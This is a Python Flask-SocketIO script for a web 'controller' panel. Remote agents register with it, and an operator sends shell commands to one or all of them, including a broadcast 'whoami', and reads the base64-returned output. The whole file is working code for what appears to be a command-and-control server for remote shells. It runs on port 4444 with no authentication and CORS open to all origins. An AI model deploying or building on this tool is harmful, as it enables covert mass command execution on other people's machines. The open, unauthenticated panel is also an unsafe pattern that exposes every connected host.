#!/usr/bin/env python3
"""
server_socketio.py
Run: python3 server_socketio.py
Open UI: http://0.0.0.0:4444/
"""

import base64
import json
import threading
import time
from flask import Flask, render_template_string, request
from flask_socketio import SocketIO, emit, join_room, leave_room

FLASK_HOST = "0.0.0.0"
FLASK_PORT = 4444

app = Flask(__name__)
app.config["SECRET_KEY"] = "dev-secret"  # change for long-term
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# clients: sid -> metadata
clients = {}
clients_lock = threading.Lock()

INDEX_HTML = """
<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <title>RailRoad Controller (SocketIO)</title>
  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
  <style>
    body { font-family: system-ui, sans-serif; padding: 12px; }
    .client { border:1px solid #ccc; padding:8px; margin:8px 0; }
    .output { background:#111; color:#eee; padding:8px; height:160px; overflow:auto; white-space:pre-wrap; font-family: monospace;}
    .controls { margin-top:6px; }
  </style>
</head>
<body>
  <h1>RailRoad Controller (SocketIO)</h1>
  <button id="refresh">Refresh clients</button>
  <button id="broadcastBtn">Broadcast: whoami</button>
  <div id="clients"></div>

<script>
const socket = io({transports:['websocket'], reconnection:true});
socket.on('connect', () => console.log('connected to server'));
socket.on('clients', (data) => {
  const cdiv = document.getElementById('clients');
  cdiv.innerHTML = '';
  for (const c of data) {
    const el = document.createElement('div');
    el.className = 'client';
    el.id = `client-${c.client_id}`;
    el.innerHTML = `
      <strong>${c.hostname || c.client_id}</strong> — ${c.addr} — cwd: ${c.cwd}<br/>
      <div class="output" id="out-${c.client_id}"></div>
      <div class="controls">
        <input id="cmd-${c.client_id}" style="width:60%" placeholder="command (e.g. uptime or cd /tmp)"/>
        <button onclick="sendCmd('${c.client_id}')">Send</button>
        <button onclick="clearOut('${c.client_id}')">Clear</button>
      </div>`;
    cdiv.appendChild(el);
  }
});

socket.on('output', (m) => {
  const id = m.client_id;
  const outEl = document.getElementById('out-' + id);
  if (!outEl) return;
  const header = `[${m.client_id} | ${m.hostname} | ${m.cwd}]`;
  const text = m.text;
  outEl.innerText = header + "\\n" + text + "\\n" + outEl.innerText;
});

function sendCmd(client_id) {
  const val = document.getElementById('cmd-' + client_id).value.trim();
  if (!val) return alert('empty');
  socket.emit('send_cmd', { client: client_id, cmd: val });
  document.getElementById('cmd-' + client_id).value = '';
}

function clearOut(client_id) {
  const outEl = document.getElementById('out-' + client_id);
  if (outEl) outEl.innerText = '';
}

document.getElementById('broadcastBtn').onclick = () => {
  socket.emit('send_cmd', { client: '__broadcast', cmd: 'whoami' });
};
document.getElementById('refresh').onclick = () => {
  socket.emit('request_clients');
};
</script>
</body>
</html>
"""

# ----------------------
# Helper functions
# ----------------------
def clients_list():
    with clients_lock:
        return [
            {
                "client_id": cid,
                "hostname": meta.get("hostname",""),
                "addr": f"{meta.get('addr','')}",
                "cwd": meta.get("cwd","")
            } for cid, meta in clients.items()
        ]

def broadcast_clients():
    socketio.emit('clients', clients_list())

# ----------------------
# SocketIO events (web UI & clients)
# ----------------------

@socketio.on('connect')
def on_connect():
    # UI and CLI both connect here. We just log.
    print("Websocket connected:", request.sid)

@socketio.on('disconnect')
def on_disconnect():
    print("Websocket disconnected:", request.sid)

@socketio.on('request_clients')
def on_request_clients():
    broadcast_clients()

# Event to receive commands from UI; forward to client(s)
@socketio.on('send_cmd')
def handle_send_cmd(data):
    client = data.get('client')
    cmd = data.get('cmd','')
    if not cmd:
        return
    sent = []
    with clients_lock:
        if client == '__broadcast':
            for cid, meta in clients.items():
                socketio.emit('cmd', {"cmd": cmd}, room=cid)
                sent.append(cid)
        else:
            if client in clients:
                socketio.emit('cmd', {"cmd": cmd}, room=client)
                sent.append(client)
    print("[INFO] sent command to:", sent)
    broadcast_clients()

# ----------------------
# Client (agent) side SocketIO handlers (from Python agents)
# The Python client will connect and emit 'register' on connect.
# ----------------------

@socketio.on('register')
def on_register(data):
    # data: { client_id, hostname, cwd, addr }
    sid = request.sid
    cid = data.get('client_id') or sid
    with clients_lock:
        clients[cid] = {
            "sid": sid,
            "hostname": data.get("hostname",""),
            "cwd": data.get("cwd",""),
            "addr": data.get("addr", ""),
            "last_seen": time.time()
        }
    # put the socketio session in a room named after client_id so we can address it
    join_room(cid)
    print(f"[INFO] client registered: {cid} {data.get('hostname')} from {data.get('addr')}")
    broadcast_clients()

@socketio.on('output')
def on_output(data):
    # data: { client_id, hostname, cwd, output_base64 }
    cid = data.get('client_id') or request.sid
    try:
        raw = base64.b64decode(data.get('output',''))
        text = raw.decode(errors='replace')
    except Exception:
        text = "[decode error]"
    # update client's cwd and hostname
    with clients_lock:
        if cid in clients:
            clients[cid]['cwd'] = data.get('cwd', clients[cid].get('cwd'))
            clients[cid]['hostname'] = data.get('hostname', clients[cid].get('hostname'))
            clients[cid]['last_seen'] = time.time()
    # push to web UI
    socketio.emit('output', {
        "client_id": cid,
        "hostname": data.get('hostname',''),
        "cwd": data.get('cwd',''),
        "text": text
    })
    broadcast_clients()

@socketio.on('client_ping')
def on_client_ping(data):
    cid = data.get('client_id') or request.sid
    with clients_lock:
        if cid in clients:
            clients[cid]['last_seen'] = time.time()

# Optional: cleanup thread to remove stale clients
def cleanup_loop():
    while True:
        now = time.time()
        removed = []
        with clients_lock:
            for cid, meta in list(clients.items()):
                if now - meta.get('last_seen', 0) > 300:  # 5 min stale
                    removed.append(cid)
                    del clients[cid]
        if removed:
            print("[CLEANUP] removed stale clients:", removed)
            socketio.emit('clients', clients_list())
        time.sleep(60)

# Flask route for UI
@app.route('/')
def index():
    return render_template_string(INDEX_HTML)

if __name__ == "__main__":
    # start cleanup thread
    t = threading.Thread(target=cleanup_loop, daemon=True)
    t.start()
    # run server (SocketIO + Flask) on FLASK_PORT
    print(f"Starting server on {FLASK_HOST}:{FLASK_PORT}")
    socketio.run(app, host=FLASK_HOST, port=FLASK_PORT, debug=False)
